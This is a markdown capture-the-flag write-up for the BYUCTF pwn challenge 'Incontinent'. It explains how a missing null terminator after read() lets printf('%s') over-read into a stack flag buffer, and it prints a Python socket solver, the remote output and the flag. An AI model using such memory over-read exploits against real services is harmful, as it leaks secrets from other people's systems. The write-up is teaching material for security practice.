@@ -1,0 +1,93 @@
+---
+title: "BYUCTF: Incontinent"
+description: "Looks like a format-string bug, but printf uses a fixed %s. The real flaw: read() never null-terminates, so 32 bytes of padding bridge the gap to the flag buffer and %s over-reads straight into the secret."
+date: 2026-05-31T11:21:46.404Z
+tags: ["ctf", "pwn", "info-leak", "missing-null-terminator", "byuctf"]
+draft: false
+---
+
+**Platform:** BYUCTF
+**Challenge:** Incontinent
+**Category:** Pwn
+**Difficulty:** Easy
+
+## Flag
+
+`byuctf{incontinent_is_one_of_my_favorite_words_lol}`
+
+## Target
+
+`<remote-host>:1366`. Local `incontinent_dist` prints a placeholder; real flag is in the same stack slot on the remote.
+
+- ELF 64-bit, **non-PIE** (`EXEC`), NX on, dynamically linked, **not stripped**.
+- Prompt: *"I've got the flag securely locked up, anything you want to say to it?"* Hint: *"make it a little more leaky"* + the name **Incontinent** → an info **leak**.
+
+## Recon
+
+`main` builds a local string on the stack (`movabs` immediates) at `[rbp-0x70]`:
+
+> "the real flag will be here on remote. If you can see this, try what you just did on the remote server"
+
+Then:
+
+```c
+char input[];                 // [rbp-0x90]
+char flag_buf[] = "...";      // [rbp-0x70]   (0x20 = 32 bytes above input)
+puts("I've got the flag...");
+read(0, input, 0x32);         // up to 50 bytes, NO null terminator
+printf("You said: ");
+printf("%s", input);          // prints until the first NUL byte
+puts("Have a nice day");
+```
+
+rodata confirms the format strings: `"You said: "`, `"%s"`, `"\nHave a nice day"`.
+
+## The bug: not format string, missing NUL
+
+The `printf` uses a **fixed** `"%s"` with `input` as the argument, so format specifiers in the input are *not* interpreted. The classic format-string bug doesn't apply. The real flaw: **`read` never null-terminates**, and `printf("%s", input)` walks memory until it hits a `\0`.
+
+Stack layout (`rbp`-relative):
+
+```
+rbp-0x90  input        <-- read() writes here (50 bytes max)
+rbp-0x70  flag_buf     <-- exactly 0x20 (32) bytes above input
+```
+
+Send **exactly 32 non-NUL bytes**: `read` fills `[rbp-0x90, rbp-0x70)` with no terminator, so `%s` prints my 32 bytes and **continues straight into `flag_buf`**, dumping the flag until its own NUL.
+
+- Too few bytes → an uninitialized NUL in the gap stops `printf` early (short input leaks nothing).
+- Too many (>32, up to 50) → starts overwriting the flag's first bytes.
+- **32 bridges the gap exactly.** No newline (it's `read`, not `fgets`).
+
+## Solution
+
+```python
+import socket, re
+s = socket.create_connection(('<remote-host>', 1366))
+s.recv(4096)
+s.sendall(b'A' * 32)                 # exactly 0x20 non-NUL bytes, no newline
+out = b''
+s.settimeout(4)
+try:
+    while True:
+        d = s.recv(4096)
+        if not d: break
+        out += d
+except socket.timeout: pass
+print(re.search(rb'byuctf\{[^}]*\}', out).group().decode())
+```
+
+Local test leaks the placeholder; remote leaks:
+
+```
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbyuctf{incontinent_is_one_of_my_favorite_words_lol}
+```
+
+## Takeaways
+
+- `read(fd, buf, n)` does **not** null-terminate, so any later `%s`/`strlen`/`strcpy` on that buffer over-reads into adjacent memory. Pad to the exact distance of the secret to bridge the gap deterministically.
+- "format string" instinct can be a bait: check whether user input is the *format* (`printf(buf)`) or just an *argument* (`printf("%s", buf)`). Here it was the latter, and the bug was termination, not specifiers.
+- Compute the leak distance straight from the frame: `input @ rbp-0x90`, `flag @ rbp-0x70` → 32 bytes.
+- The name is the spec: *incontinent* = can't hold it in = it leaks.
+
+*0xAdham*
